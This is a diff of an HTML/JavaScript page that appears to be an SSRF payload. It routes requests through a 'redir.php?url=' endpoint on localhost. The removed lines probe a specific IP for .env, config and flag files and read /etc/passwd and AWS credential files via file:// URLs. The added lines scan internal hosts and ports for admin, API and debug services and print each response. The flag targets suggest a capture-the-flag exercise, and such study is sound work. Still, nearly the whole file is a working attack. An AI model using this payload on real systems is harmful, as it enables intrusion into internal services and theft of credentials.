@@ -1,35 +1,41 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Local Server Exploration</title>
+    <title>Internal Service Discovery</title>
 </head>
 <body>
-    <h1>Exploring Target Server Files</h1>
+    <h1>Scanning for Internal Services</h1>
     <div id="results"></div>
     
     <script>
         var results = "";
         
-        // Test accessing the target server itself and common files
+        // Test common internal services and ports
         var targets = [
-            'http://54.209.100.76/',
-            'http://54.209.100.76/index.php',
-            'http://54.209.100.76/config.php',
-            'http://54.209.100.76/.env',
-            'http://54.209.100.76/admin/',
-            'http://54.209.100.76/backup/',
-            'http://54.209.100.76/secret/',
-            'http://54.209.100.76/flag.txt',
-            'http://54.209.100.76/flag',
-            'http://54.209.100.76/credentials',
-            'http://54.209.100.76/aws-credentials',
-            'http://54.209.100.76/phpinfo.php',
-            'http://54.209.100.76/debug.php',
-            'http://54.209.100.76/test.php',
-            'file:///etc/passwd',
-            'file:///var/www/html/.env',
-            'file:///home/ubuntu/.aws/credentials',
-            'file:///root/.aws/credentials'
+            'http://localhost:80/',
+            'http://localhost:8080/',
+            'http://localhost:3000/',
+            'http://localhost:5000/',
+            'http://localhost:8000/',
+            'http://127.0.0.1:80/',
+            'http://127.0.0.1:8080/',
+            'http://0.0.0.0:80/',
+            'http://internal/',
+            'http://admin/',
+            'http://backend/',
+            'http://api/',
+            'http://management/',
+            'http://localhost/admin/',
+            'http://localhost/api/',
+            'http://localhost/internal/',
+            'http://localhost/management/',
+            'http://localhost/status/',
+            'http://localhost/health/',
+            'http://localhost/debug/',
+            'http://localhost/.env',
+            'http://localhost/config',
+            'http://localhost/config.php',
+            'http://localhost/phpinfo.php'
         ];
         
         for(var i = 0; i < targets.length; i++) {
@@ -38,13 +44,8 @@
                 var xhr = new XMLHttpRequest();
                 xhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(targets[i]), false);
                 xhr.send();
-                
-                if(xhr.responseText && xhr.responseText.length > 10) {
-                    results += "<div style='background:#e8f5e8;padding:10px;border:1px solid green;'>✅ SUCCESS: " + xhr.responseText.length + " bytes</div>";
-                    results += "<div style='background:#f0f0f0;padding:10px;max-height:300px;overflow:scroll;font-size:10px;white-space:pre-wrap;'>" + xhr.responseText + "</div>";
-                } else {
-                    results += "<div style='background:#ffe8e8;padding:3px;'>❌ Empty or short response</div>";
-                }
+                results += "<div style='background:#e8f5e8;padding:10px;border:1px solid green;'>✅ SUCCESS: " + xhr.responseText.length + " bytes</div>";
+                results += "<div style='background:#f0f0f0;padding:10px;max-height:200px;overflow:scroll;font-size:10px;'>" + xhr.responseText.substring(0, 500) + "...</div>";
             } catch(e) {
                 results += "<div style='background:#ffe8e8;padding:3px;'>❌ " + e.message + "</div>";
             }
